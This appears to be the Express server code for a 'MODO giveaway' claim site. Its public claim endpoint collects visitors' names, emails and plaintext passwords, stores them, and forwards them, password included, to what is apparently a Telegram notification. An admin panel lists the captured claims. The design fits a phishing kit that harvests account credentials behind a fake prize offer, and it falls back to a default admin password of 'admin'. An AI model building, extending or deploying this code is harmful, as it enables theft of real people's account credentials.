const express = require("express");
const path = require("node:path");
const fs = require("node:fs");
const { createHmac, timingSafeEqual } = require("node:crypto");
const db = require("./lib/db");
const { sendClaimNotification, handleTelegramWebhook } = require("./lib/telegram");

const envFile = path.join(__dirname, ".env.local");
if (fs.existsSync(envFile)) {
  require("dotenv").config({ path: envFile, quiet: true });
}

const PORT = Number(process.env.PORT) || 3000;
const SESSION_TTL_MS = 12 * 60 * 60 * 1000;

function getAdminPassword() {
  if (process.env.ADMIN_PASSWORD) return process.env.ADMIN_PASSWORD;
  const envFile = path.join(__dirname, ".env.local");
  if (fs.existsSync(envFile)) {
    for (const line of fs.readFileSync(envFile, "utf8").split("\n")) {
      const m = line.match(/^\s*ADMIN_PASSWORD\s*=\s*(.+)\s*$/);
      if (m) return m[1].trim().replace(/^["']|["']$/g, "");
    }
  }
  return "admin";
}

const app = express();
app.use(express.json());

function readCookies(req) {
  const out = {};
  const raw = req.headers.cookie;
  if (raw) {
    for (const part of raw.split(";")) {
      const idx = part.indexOf("=");
      if (idx > 0) {
        out[part.slice(0, idx).trim()] = decodeURIComponent(
          part.slice(idx + 1).trim(),
        );
      }
    }
  }
  return out;
}

const SECRET = getAdminPassword();

function sign(payload) {
  return createHmac("sha256", SECRET).update(payload).digest("base64url");
}

function makeSessionToken() {
  const payload = String(Date.now() + SESSION_TTL_MS);
  return `${payload}.${sign(payload)}`;
}

function hasValidSession(req) {
  const token = readCookies(req).admin_session;
  if (!token) return false;
  const dot = token.indexOf(".");
  if (dot <= 0) return false;
  const payload = token.slice(0, dot);
  const sig = token.slice(dot + 1);
  const expected = sign(payload);
  const a = Buffer.from(sig);
  const b = Buffer.from(expected);
  if (a.length !== b.length || !timingSafeEqual(a, b)) return false;
  return Number(payload) > Date.now();
}

app.get("/", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "claim.html"));
});

app.post("/api/claim", async (req, res) => {
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "local";

  try {
    if (!(await db.claimAllowed(ip))) {
      return res
        .status(429)
        .json({ error: "Too many attempts. Please wait a moment and try again." });
    }

    const name = String(req.body?.code ?? req.body?.name ?? "").trim();
    const email = String(req.body?.email ?? "").trim();
    const password = String(req.body?.password ?? "").trim();

    const { row, claimCode } = await db.insertClaim({
      name,
      email,
      password,
      createdAt: new Date().toISOString(),
    });

    sendClaimNotification({
      id: row.id,
      name,
      email,
      password,
      claimCode,
    });

    res.json({ ok: true, name, email, claimCode });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Something went wrong, try again." });
  }
});

app.get("/admin", (_req, res) => {
  if (hasValidSession(_req))
    return res.sendFile(path.join(__dirname, "public", "admin.html"));
  res.sendFile(path.join(__dirname, "public", "login.html"));
});

app.post("/api/admin/login", (req, res) => {
  const password = String(req.body?.password ?? "");
  if (!SECRET || password !== SECRET) {
    return res.status(401).json({ error: "Incorrect password" });
  }
  res.setHeader(
    "Set-Cookie",
    `admin_session=${makeSessionToken()}; HttpOnly; SameSite=Lax; Path=/; Max-Age=${SESSION_TTL_MS / 1000}`,
  );
  res.json({ ok: true });
});

app.post("/api/admin/logout", (_req, res) => {
  res.setHeader(
    "Set-Cookie",
    "admin_session=; HttpOnly; SameSite=Lax; Path=/; Max-Age=0",
  );
  res.json({ ok: true });
});

app.get("/api/admin/claims", async (_req, res) => {
  if (!hasValidSession(_req)) return res.status(401).json({ error: "Unauthorized" });
  try {
    const claims = await db.listClaims();
    res.json({ claims });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Something went wrong, try again." });
  }
});

app.post("/api/admin/approve", async (req, res) => {
  if (!hasValidSession(req)) return res.status(401).json({ error: "Unauthorized" });
  const id = Number(req.body?.id);
  if (!Number.isFinite(id)) {
    return res.status(400).json({ error: "Missing id" });
  }
  try {
    const row = await db.getClaimById(id);
    if (!row) return res.status(404).json({ error: "Claim not found" });
    await db.setClaimStatus(id, "approved");
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Something went wrong, try again." });
  }
});

app.post("/api/admin/reject", async (req, res) => {
  if (!hasValidSession(req)) return res.status(401).json({ error: "Unauthorized" });
  const id = Number(req.body?.id);
  if (!Number.isFinite(id)) return res.status(400).json({ error: "Missing id" });
  try {
    await db.setClaimStatus(id, "rejected");
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Something went wrong, try again." });
  }
});

app.use(express.static(path.join(__dirname, "public")));

app.post("/api/admin/delete", async (req, res) => {
  if (!hasValidSession(req)) return res.status(401).json({ error: "Unauthorized" });
  const id = Number(req.body?.id);
  if (!Number.isFinite(id)) return res.status(400).json({ error: "Missing id" });
  try {
    await db.deleteClaim(id);
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Something went wrong, try again." });
  }
});

app.use((err, _req, res, _next) => {
  console.error(err);
  res.status(500).json({ error: "Something went wrong, try again." });
});

app.post("/api/tghook", async (req, res) => {
  try {
    await handleTelegramWebhook(req.body ?? {});
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`MODO giveaway server running on http://localhost:${PORT} (storage: Supabase)`);
});